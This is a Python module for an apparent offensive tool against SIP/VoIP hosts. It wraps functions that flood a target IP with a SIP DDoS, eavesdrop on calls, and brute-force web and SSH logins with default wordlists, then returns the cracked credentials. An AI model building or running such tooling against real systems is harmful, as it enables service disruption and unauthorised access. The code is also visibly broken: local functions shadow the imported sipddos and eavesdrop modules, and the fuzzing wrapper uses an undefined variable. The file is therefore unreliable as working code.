from cmath import log
import time
import imp
from modules.exploit import sipddos, eavesdrop, bruteforce_login, bruteforce_ssh, fuzzing
from modules.initial import clear
import sys
from py_console import console

default_username_list = 'data/wordlist/username.txt'
default_password_list = 'data/wordlist/password.txt'
default_username = 'root'


def sipddos(ip, port, duration):
    print("Start Flood DDoS Attack")
    ip = str(ip)
    port = int(port)
    duration = int(duration)
    ddos = sipddos.send_packets(ip, port, duration)
    if ddos is not None:
        return ddos
    else:
        return -1


def eavesdrop():
    try:
        filename = time.time()
        eavesdrop.eavesdropping(filename)
    except Exception as e:
        console.error("An Error Occurred At Eavesdrop Step!!!")
        console.error(e)
        sys.exit(1)
    except:
        console.error("Unexpected Error Occurred At Eavesdrop Step!!!")
        sys.exit(1)


def brf_login(ip, default_username_list, default_password_list):
    try:
        return bruteforce_login.bruteforcelogin(ip, default_username_list, default_password_list)
    except Exception as e:
        console.error("An Error Occurred At Brute Force Login Step!!!")
        console.error(e)
        sys.exit(1)
    except:
        console.error("Unexpected Error Occurred At Brute Force Login Step!!!")
        sys.exit(1)


def brf_ssh(ip, default_username_list, default_password_list):
    try:
        return bruteforce_ssh.bruteforce(
            ip, default_username_list, default_password_list)
    except Exception as e:
        console.error("An Error Occurred At Brute Force SSH Step!!!")
        console.error(e)
        sys.exit(1)
    except:
        console.error("Unexpected Error Occurred At Brute Force SSH Step!!!")
        sys.exit(1)


def dirfuzzing(ip, fuzzing_list):
    try:
        fuzzing.dir_fuzzing(targetURL, fuzzing_list)
    except Exception as e:
        console.error("An Error Occurred At Directory Fuzzing Step!!!")
        console.error(e)
        sys.exit(1)
    except:
        console.error("Unexpected Error Occurred At Directory Fuzzing Step!!!")
        sys.exit(1)


def sipcrackextension():
    pass


def exploit(ip, default_username_list, default_password_list, fuzzing_list):
    data = []
    try:
        # eavesdrop()
        # dirfuzzing(ip, fuzzing_list)
        username, password = brf_login(
            ip, default_username_list, default_password_list)
        login_info = {'name': 'Web Login Information',
                      'value': {
                          'username': username,
                          'password': password,
                      }
                      }
        data.append(login_info)
        username, password = brf_ssh(ip, default_username_list, default_password_list)
        login_info = {'name': 'SSH Login Information',
                      'value': {
                          'username': username,
                          'password': password,
                      }
                      }
        data.append(login_info)
        # sipcrackextension()
    except Exception as e:
        console.error("An Error Occurred!!!")
        console.error(e)
        # sys.exit(1)
    except:
        console.error("Unexpected Error Occurred!!!")
        # sys.exit(1)
    finally:
        return data
